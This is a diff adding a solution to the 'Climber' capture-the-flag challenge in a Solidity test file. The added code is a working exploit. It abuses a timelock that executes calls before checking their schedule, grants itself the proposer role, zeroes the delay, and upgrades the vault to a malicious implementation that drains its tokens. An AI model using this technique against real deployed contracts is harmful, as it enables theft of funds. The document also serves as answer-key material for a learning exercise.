@@ -85,7 +85,35 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        Exploit ex = new Exploit(timelock);
+
+        bytes32 salt = bytes32(0);
+        uint256 executeCount = 4;
+        address[] memory targets = new address[](executeCount);
+        uint256[] memory values = new uint256[](executeCount);
+        bytes[] memory dataElements = new bytes[](executeCount);
+
+        bytes memory grantRole = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(ex));
+        targets[0] = address(timelock);
+        dataElements[0] = grantRole;
+
+        bytes memory updateDelay = abi.encodeWithSelector(timelock.updateDelay.selector, 0);
+        targets[1] = address(timelock);
+        dataElements[1] = updateDelay;
+
+        bytes memory callEx = abi.encodeWithSelector(ex.schedule.selector);
+        targets[2] = address(ex);
+        dataElements[2] = callEx;
+
+        bytes memory upgrade = abi.encodeWithSelector(
+            vault.upgradeToAndCall.selector,
+            address(new MaliciousVault()),
+            abi.encodeWithSelector(MaliciousVault.exploit.selector, token, recovery)
+        );
+        targets[3] = address(vault);
+        dataElements[3] = upgrade;
+
+        ex.run(targets, values, dataElements, salt);
     }
 
     /**
@@ -94,5 +122,38 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract Exploit {
+    bytes32 salt;
+    uint256[] values;
+    address[] targets;
+    bytes[] dataElements;
+    ClimberTimelock timelock;
+
+    constructor(ClimberTimelock _timelock) {
+        timelock = _timelock;
+    }
+
+    function run(address[] memory _targets, uint256[] memory _values, bytes[] memory _dataElements, bytes32 _salt)
+        external
+    {
+        targets = _targets;
+        values = _values;
+        dataElements = _dataElements;
+        salt = _salt;
+
+        timelock.execute(targets, values, dataElements, salt);
+    }
+
+    function schedule() external {
+        timelock.schedule(targets, values, dataElements, salt);
+    }
+}
+
+contract MaliciousVault is ClimberVault {
+    function exploit(DamnValuableToken token, address recovery) external {
+        token.transfer(recovery, token.balanceOf(address(this)));
     }
 }
